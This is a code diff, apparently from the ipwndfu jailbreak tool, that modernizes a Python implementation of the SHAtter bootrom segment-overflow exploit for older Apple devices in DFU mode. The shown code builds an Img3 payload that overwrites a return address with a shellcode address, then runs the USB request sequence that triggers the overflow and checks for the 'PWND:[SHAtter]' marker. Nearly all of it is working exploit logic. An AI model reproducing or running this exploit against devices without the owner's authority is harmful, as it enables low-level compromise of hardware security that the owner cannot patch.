@@ -8,9 +8,9 @@ import time
 from ipwndfu import dfu
 
 
-def generate_payload():
+def generate_payload() -> bytes:
     shellcode_address = 0x8402F198 + 1
-    data = struct.pack("<40sI", "\xF0" * 40, shellcode_address)
+    data = struct.pack("<40sI", b"\xF0" * 40, shellcode_address)
     tags = data + struct.pack("<4s2I4s2I", "SHSH"[::-1], 12, 0, "CERT"[::-1], 12, 0)
     header = struct.pack(
         "<4s3I4s", "Img3"[::-1], 20 + len(tags), len(tags), len(data), "ibss"[::-1]
@@ -21,10 +21,10 @@ def generate_payload():
     return header + tags + shellcode
 
 
-def exploit():
+def exploit() -> None:
     print("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***")
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     print("Found:", device.serial_number)
 
     if "PWND:[" in device.serial_number:
@@ -49,34 +49,34 @@ def exploit():
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     dfu.request_image_validation(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     dfu.get_data(device, 0x2C000)
     dfu.release_device(device)
 
     time.sleep(0.5)
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     dfu.reset_counters(device)
     dfu.get_data(device, 0x140)
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     dfu.request_image_validation(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     dfu.send_data(device, generate_payload())
     dfu.get_data(device, 0x2C000)
     dfu.release_device(device)
 
     time.sleep(0.5)
 
-    device = dfu.acquire_device()
+    device = dfu.assert_acquire_device()
     failed = "PWND:[SHAtter]" not in device.serial_number
     dfu.release_device(device)
 
